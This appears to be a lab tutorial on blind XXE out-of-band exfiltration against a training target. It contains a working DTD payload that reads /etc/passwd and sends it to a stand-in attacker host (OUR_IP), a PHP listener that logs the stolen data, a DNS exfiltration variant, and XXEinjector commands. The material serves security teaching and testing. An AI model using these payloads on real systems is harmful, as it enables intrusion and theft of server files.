# Blind Data Exfiltration

In the previous section, we encountered a blind XXE vulnerability where XML input entities produced no output. While PHP runtime errors aided exploitation there, we now address scenarios with **no output and no error messages**.

## Out-of-Band Data Exfiltration

When standard methods fail (as with the `/blind` endpoint), **Out-of-Band (OOB) Data Exfiltration** becomes essential. This technique mirrors approaches used in blind SQL injection, command injection, and XSS attacks.

### Attack Mechanism

Instead of outputting file content directly, we force the web application to send an HTTP request to our server containing the file data:

1. Use a parameter entity to read the file
2. Base64 encode it with PHP filters
3. Create an external parameter entity that sends a request to our IP with the encoded content

### DTD Payload

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

The encoded file content appears in the URL query parameter, e.g., `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`.

### Server Setup

**Create index.php:**
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

**Start PHP server:**
```bash
php -S 0.0.0.0:8000
```

### Exploitation Request

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Send this via POST to `/blind/submitDetails.php`. Check your terminal for the decoded output.

### Alternative: DNS Exfiltration

Place encoded data as a subdomain (`ENCODEDTEXT.our.website.com`) and capture traffic with `tcpdump`. More advanced but avoids HTTP logs.

---

## Automated OOB Exfiltration with XXEinjector

Manual exploitation is tedious. **XXEinjector** automates blind XXE attacks for basic XXE, CDATA, error-based, and OOB variants.

### Setup

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

### Configuration

Save your HTTP request to a file, including only the XML declaration and `XXEINJECT` marker:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Type: text/plain;charset=UTF-8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

### Execution

```bash
ruby XXEinjector.rb --host=[YOUR_IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

Results are stored in `Logs/[TARGET_IP]/[FILE_PATH].log`.

---

**Tip:** Explore other XXE techniques with XXEinjector to maximize your testing coverage.
